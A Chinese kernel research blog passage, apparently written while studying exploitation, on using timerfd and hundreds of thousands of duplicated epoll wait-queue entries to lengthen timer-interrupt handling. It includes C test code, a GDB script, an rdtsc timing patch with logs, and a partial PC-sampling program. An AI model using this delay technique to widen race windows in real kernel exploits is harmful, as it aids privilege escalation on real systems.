<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">timerfd_setup</span><span class="params">(struct timerfd_ctx *ctx, <span class="keyword">int</span> flags,</span></span></span><br><span class="line"><span class="function"><span class="params">			 <span class="keyword">const</span> struct itimerspec64 *ktmr)</span></span></span><br><span class="line">..</span><br><span class="line">	hrtimer_init(&amp;ctx-&gt;t.tmr, clockid, htmode);</span><br><span class="line">	hrtimer_set_expires(&amp;ctx-&gt;t.tmr, texp);</span><br><span class="line">	ctx-&gt;t.tmr.function = timerfd_tmrproc;</span><br></pre></td></tr></table></figure>

<p><code>**struct timerfd_ctx</code>, <code>struct file</code> , <code>struct hrtimer</code> 之间的关系**</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timerfd_ctx</span> *<span class="title">ctx</span> = <span class="title">file</span>-&gt;<span class="title">private_data</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hrtimer</span> *<span class="title">htmr</span> = &amp;<span class="title">ctx</span>-&gt;<span class="title">t</span>.<span class="title">tmr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timerfd_ctx</span> *<span class="title">ctx</span> = <span class="title">container_of</span>(<span class="title">htmr</span>, <span class="title">struct</span> <span class="title">timerfd_ctx</span>, <span class="title">t</span>.<span class="title">tmr</span>);</span></span><br></pre></td></tr></table></figure>

<p><strong>测试代码：</strong></p>
<p>向 wait queue 中添加 500 * 500 个 entry</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYSCHK(x) (&#123;          \</span></span><br><span class="line">  typeof(x) __res = (x);      \</span><br><span class="line">  <span class="keyword">if</span> (__res == (typeof(x))<span class="number">-1</span>) \</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"SYSCHK("</span> #x <span class="string">")"</span>); \</span><br><span class="line">  __res;                      \</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_EPOLL_INSTANCES 500</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_DUP_FDS 500</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NUM_TIMER_WAITERS (NUM_EPOLL_INSTANCES * NUM_DUP_FDS)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NSEC_PER_SEC 1000000000UL <span class="comment">// 1s = 1000000000ns</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pin_task_to</span><span class="params">(<span class="keyword">int</span> pid, <span class="keyword">int</span> cpu)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">cpu_set_t</span> cset;</span><br><span class="line">  CPU_ZERO(&amp;cset);</span><br><span class="line">  CPU_SET(cpu, &amp;cset);</span><br><span class="line">  SYSCHK(sched_setaffinity(pid, <span class="keyword">sizeof</span>(<span class="keyword">cpu_set_t</span>), &amp;cset));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pin_to</span><span class="params">(<span class="keyword">int</span> cpu)</span> </span>&#123; pin_task_to(<span class="number">0</span>, cpu); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function">struct timespec <span class="title">get_mono_time</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">ts</span>;</span></span><br><span class="line">  clock_gettime(CLOCK_MONOTONIC, &amp;ts);</span><br><span class="line">  <span class="keyword">return</span> ts;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">ts_add</span><span class="params">(struct timespec *ts, <span class="keyword">unsigned</span> <span class="keyword">long</span> nsecs)</span> </span>&#123;</span><br><span class="line">  ts-&gt;tv_nsec += nsecs;</span><br><span class="line">  <span class="keyword">if</span> (ts-&gt;tv_nsec &gt;= NSEC_PER_SEC) &#123;</span><br><span class="line">    ts-&gt;tv_sec++;</span><br><span class="line">    ts-&gt;tv_nsec -= NSEC_PER_SEC;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		pin_to(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">int</span> timerfd = timerfd_create(CLOCK_MONOTONIC, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (timerfd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"timerfd_create"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建 epoll instances</span></span><br><span class="line">    <span class="keyword">int</span> epoll_fds[NUM_EPOLL_INSTANCES];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_EPOLL_INSTANCES; i++) &#123;</span><br><span class="line">        epoll_fds[i] = epoll_create1(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (epoll_fds[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">"epoll_create1"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// dup timer fd  </span></span><br><span class="line">    <span class="keyword">int</span> timer_fds[NUM_DUP_FDS];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_DUP_FDS; i++) &#123;</span><br><span class="line">        timer_fds[i] = dup(timerfd);</span><br><span class="line">        <span class="keyword">if</span> (timer_fds[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">"dup"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// epoll_ctl EPOLL_CTL_ADD 添加到 wait queue</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">ev</span> = &#123;</span> <span class="number">0</span> &#125;;</span><br><span class="line">    ev.events = EPOLLIN;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_EPOLL_INSTANCES; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; NUM_DUP_FDS; j++) &#123;</span><br><span class="line">            ev.data.fd = timer_fds[j];</span><br><span class="line">            <span class="keyword">if</span> (epoll_ctl(epoll_fds[i], EPOLL_CTL_ADD, timer_fds[j], &amp;ev) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                perror(<span class="string">"epoll_ctl"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">base_time</span> = <span class="title">get_mono_time</span>();</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">itimerspec</span> <span class="title">timer_value</span> = &#123;</span> .it_value = base_time &#125;;</span><br><span class="line">    ts_add(&amp;timer_value.it_value, <span class="number">1000</span> * <span class="number">1000</span> * <span class="number">1000</span>); <span class="comment">// timer at +1s</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (timerfd_settime(timerfd, TFD_TIMER_ABSTIME, &amp;timer_value, <span class="literal">NULL</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">"timerfd_settime"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_EPOLL_INSTANCES; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> nfds = epoll_wait(epoll_fds[i], &amp;ev, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">        <span class="keyword">if</span> (nfds &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">"epoll_wait"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> value;</span><br><span class="line">    <span class="built_in">read</span>(timerfd, &amp;value, <span class="keyword">sizeof</span>(value)) == <span class="keyword">sizeof</span>(value);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"value:  %ld\n"</span>, value);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_EPOLL_INSTANCES; i++) &#123;</span><br><span class="line">        <span class="built_in">close</span>(epoll_fds[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NUM_DUP_FDS; i++) &#123;</span><br><span class="line">        <span class="built_in">close</span>(timer_fds[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">close</span>(timerfd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>如何观测延迟效果？</strong></p>
<p>在 GDB 中可以查看队列中的 entry，数量与设置的一致</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b timerfd_triggered</span><br><span class="line"><span class="built_in">set</span> $head = &amp;ctx.wqh.head</span><br><span class="line"><span class="built_in">set</span> $node = $head</span><br><span class="line"><span class="keyword">while</span> $node.next != $head</span><br><span class="line">p $node.next</span><br><span class="line"><span class="built_in">set</span> $node = $node.next</span><br><span class="line"><span class="built_in">end</span></span><br><span class="line">p *$head</span><br></pre></td></tr></table></figure>

<p>加一点 patch 用 <code>rdtsc</code> 可以粗略测量一下延迟效果</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">**<span class="number">0xffffffff81b8b67e</span> &lt;+<span class="number">49</span>&gt;:	rdtsc**</span><br><span class="line"><span class="number">0xffffffff81b8b680</span> &lt;+<span class="number">51</span>&gt;:	shl    rdx,<span class="number">0x20</span></span><br><span class="line"><span class="number">0xffffffff81b8b684</span> &lt;+<span class="number">55</span>&gt;:	<span class="keyword">or</span>     rax,rdx</span><br><span class="line"><span class="number">0xffffffff81b8b687</span> &lt;+<span class="number">58</span>&gt;:	lea    r12,[rbx+<span class="number">0x88</span>]</span><br><span class="line"><span class="number">0xffffffff81b8b68e</span> &lt;+<span class="number">65</span>&gt;:	mov    r14,rax</span><br><span class="line"><span class="number">0xffffffff81b8b691</span> &lt;+<span class="number">68</span>&gt;:	mov    rdi,r12</span><br><span class="line"><span class="number">0xffffffff81b8b694</span> &lt;+<span class="number">71</span>&gt;:	call   <span class="number">0xffffffff81bde9d0</span> &lt;_raw_spin_lock_irqsave&gt;</span><br><span class="line"><span class="number">0xffffffff81b8b699</span> &lt;+<span class="number">76</span>&gt;:	inc    QWORD PTR [rbx+<span class="number">0xa0</span>]</span><br><span class="line"><span class="number">0xffffffff81b8b6a0</span> &lt;+<span class="number">83</span>&gt;:	mov    edx,<span class="number">0x1</span></span><br><span class="line"><span class="number">0xffffffff81b8b6a5</span> &lt;+<span class="number">88</span>&gt;:	mov    rdi,r12</span><br><span class="line"><span class="number">0xffffffff81b8b6a8</span> &lt;+<span class="number">91</span>&gt;:	mov    WORD PTR [rbx+<span class="number">0xac</span>],<span class="number">0x1</span></span><br><span class="line"><span class="number">0xffffffff81b8b6b1</span> &lt;+<span class="number">100</span>&gt;:	mov    r13,rax</span><br><span class="line"><span class="number">0xffffffff81b8b6b4</span> &lt;+<span class="number">103</span>&gt;:	mov    esi,<span class="number">0x3</span></span><br><span class="line"><span class="number">0xffffffff81b8b6b9</span> &lt;+<span class="number">108</span>&gt;:	call   <span class="number">0xffffffff810ad650</span> &lt;__wake_up_locked_key&gt;</span><br><span class="line"><span class="number">0xffffffff81b8b6be</span> &lt;+<span class="number">113</span>&gt;:	mov    rsi,r13</span><br><span class="line"><span class="number">0xffffffff81b8b6c1</span> &lt;+<span class="number">116</span>&gt;:	mov    rdi,r12</span><br><span class="line"><span class="number">0xffffffff81b8b6c4</span> &lt;+<span class="number">119</span>&gt;:	call   <span class="number">0xffffffff81bde5b0</span> &lt;_raw_spin_unlock_irqrestore&gt;</span><br><span class="line">**<span class="number">0xffffffff81b8b6c9</span> &lt;+<span class="number">124</span>&gt;:	rdtsc**</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/fs/timerfd.c b/fs/timerfd.c</span><br><span class="line">index e9c96a0c79f1..b919b24b4d48 <span class="number">100644</span></span><br><span class="line">--- a/fs/timerfd.c</span><br><span class="line">+++ b/fs/timerfd.c</span><br><span class="line">@@ <span class="number">-64</span>,<span class="number">11</span> +<span class="number">64</span>,<span class="number">20</span> @@ <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">timerfd_triggered</span><span class="params">(struct timerfd_ctx *ctx)</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">+    u64 start_time, end_time;</span><br><span class="line">+</span><br><span class="line">+    pr_warn(<span class="string">"[%s] %s enter\n"</span>, current-&gt;comm, __func__);</span><br><span class="line">+</span><br><span class="line">+    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(<span class="string">"rdtsc; shlq $32, %%rdx; orq %%rdx, %0"</span></span></span></span><br><span class="line"><span class="function"><span class="params">+              : <span class="string">"=a"</span>(start_time) :: <span class="string">"%rdx"</span>)</span></span>;</span><br><span class="line">        spin_lock_irqsave(&amp;ctx-&gt;wqh.lock, flags);</span><br><span class="line">        ctx-&gt;expired = <span class="number">1</span>;</span><br><span class="line">        ctx-&gt;ticks++;</span><br><span class="line">        wake_up_locked_poll(&amp;ctx-&gt;wqh, EPOLLIN);</span><br><span class="line">        spin_unlock_irqrestore(&amp;ctx-&gt;wqh.lock, flags);</span><br><span class="line">+    <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(<span class="string">"rdtsc; shlq $32, %%rdx; orq %%rdx, %0"</span></span></span></span><br><span class="line"><span class="function"><span class="params">+              : <span class="string">"=a"</span>(end_time) :: <span class="string">"%rdx"</span>)</span></span>;</span><br><span class="line">+    pr_warn(<span class="string">"[%s] %s exit, %lld\n"</span>, current-&gt;comm, __func__, end_time - start_time);</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>系统正常运行的时候 tick 数大概在 3000 ～ 30000, 创建 500 * 500 个 entry 可以使cpu 运行时间增大 3～4 个数量级(测试虚拟机的CPU是单核 2000 MHz)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[ <span class="number">1134.053250</span>] [swapper/<span class="number">0</span>] timerfd_triggered <span class="built_in">exit</span>, <span class="number">2976</span></span><br><span class="line">[ <span class="number">1134.053250</span>] [swapper/<span class="number">0</span>] timerfd_triggered enter</span><br><span class="line">[ <span class="number">1134.053250</span>] [swapper/<span class="number">0</span>] timerfd_triggered <span class="built_in">exit</span>, <span class="number">3970</span></span><br><span class="line">[ <span class="number">1134.552271</span>] [swapper/<span class="number">0</span>] timerfd_triggered enter</span><br><span class="line">[ <span class="number">1134.552906</span>] [swapper/<span class="number">0</span>] timerfd_triggered <span class="built_in">exit</span>, <span class="number">11616</span></span><br><span class="line">[ <span class="number">1175.552958</span>] [swapper/<span class="number">0</span>] timerfd_triggered enter</span><br><span class="line">[ <span class="number">1175.553871</span>] [swapper/<span class="number">0</span>] timerfd_triggered <span class="built_in">exit</span>, <span class="number">32663</span></span><br><span class="line">[ <span class="number">1176.052796</span>] [swapper/<span class="number">0</span>] timerfd_triggered enter</span><br><span class="line">[ <span class="number">1176.053719</span>] [swapper/<span class="number">0</span>] timerfd_triggered <span class="built_in">exit</span>, <span class="number">29340</span></span><br><span class="line">[ <span class="number">1184.738834</span>] [swapper/<span class="number">0</span>] timerfd_triggered enter</span><br><span class="line">**[ <span class="number">1184.739757</span>] [swapper/<span class="number">0</span>] timerfd_triggered <span class="built_in">exit</span>, <span class="number">27116541</span> <span class="comment">// 500 * 500</span></span><br><span class="line">...**</span><br><span class="line">[ <span class="number">1588.076916</span>] [swapper/<span class="number">0</span>] timerfd_triggered enter</span><br><span class="line">**[ <span class="number">1588.077841</span>] [swapper/<span class="number">0</span>] timerfd_triggered <span class="built_in">exit</span>, <span class="number">28924883</span> <span class="comment">// 500 * 500</span></span><br><span class="line">...**</span><br><span class="line">[ <span class="number">1596.735608</span>] [swapper/<span class="number">0</span>] timerfd_triggered enter</span><br><span class="line">**[ <span class="number">1596.736503</span>] [swapper/<span class="number">0</span>] timerfd_triggered <span class="built_in">exit</span>, <span class="number">28029898</span> <span class="comment">// 500 * 500**</span></span><br><span class="line">..</span><br><span class="line">[ <span class="number">1222.384483</span>] [swapper/<span class="number">0</span>] timerfd_triggered enter</span><br><span class="line">**[ <span class="number">1222.385381</span>] [swapper/<span class="number">0</span>] timerfd_triggered <span class="built_in">exit</span>, <span class="number">8511668</span> <span class="comment">// 100 * 500**</span></span><br><span class="line">...</span><br><span class="line">[ <span class="number">1265.026284</span>] [swapper/<span class="number">0</span>] timerfd_triggered enter</span><br><span class="line">**[ <span class="number">1265.027208</span>] [swapper/<span class="number">0</span>] timerfd_triggered <span class="built_in">exit</span>, <span class="number">1202548</span> <span class="comment">// 10 * 500**</span></span><br></pre></td></tr></table></figure>

<h3 id="一种观测代码被中断位置的方法"><a href="#一种观测代码被中断位置的方法" class="headerlink" title="一种观测代码被中断位置的方法"></a>一种观测代码被中断位置的方法</h3><p>原文的附录：</p>
<blockquote>
<p>I tried firing an interval timer at 100Hz (using timer_create()), with a signal handler that logs the PC register</p>
</blockquote>
<p>代码实现：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ucontext.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/user.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;err.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SYSCHK(x) (&#123;          \</span></span><br><span class="line">  typeof(x) __res = (x);      \</span><br><span class="line">  <span class="keyword">if</span> (__res == (typeof(x))<span class="number">-1</span>) \</span><br><span class="line">    err(<span class="number">1</span>, <span class="string">"SYSCHK("</span> #x <span class="string">")"</span>); \</span><br><span class="line">  __res;                      \</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pin_task_to</span><span class="params">(<span class="keyword">int</span> pid, <span class="keyword">int</span> cpu)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">cpu_set_t</span> cset;</span><br><span class="line">  CPU_ZERO(&amp;cset);</span><br><span class="line">  CPU_SET(cpu, &amp;cset);</span><br><span class="line">  SYSCHK(sched_setaffinity(pid, <span class="keyword">sizeof</span>(<span class="keyword">cpu_set_t</span>), &amp;cset));</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pin_to</span><span class="params">(<span class="keyword">int</span> cpu)</span> </span>&#123; pin_task_to(<span class="number">0</span>, cpu); &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">timer_handler</span><span class="params">(<span class="keyword">int</span> signum, <span class="keyword">siginfo_t</span> *info, <span class="keyword">void</span> *context)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">ucontext_t</span> *ucontext = (<span class="keyword">ucontext_t</span> *) context;</span><br><span class="line">    <span class="keyword">void</span> *pc = (<span class="keyword">void</span> *) ucontext-&gt;uc_mcontext.gregs[REG_RIP];</span><br><span class="line">    <span class="keyword">long</span> rax = ucontext-&gt;uc_mcontext.gregs[REG_RAX];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Timer fired, PC = %p, rax: %ld\n"</span>, pc, rax);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    pin_to(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set up the signal handler for SIGALRM</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sa</span>;</span></span><br><span class="line">    <span class="built_in">memset</span>(&amp;sa, <span class="number">0</span>, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    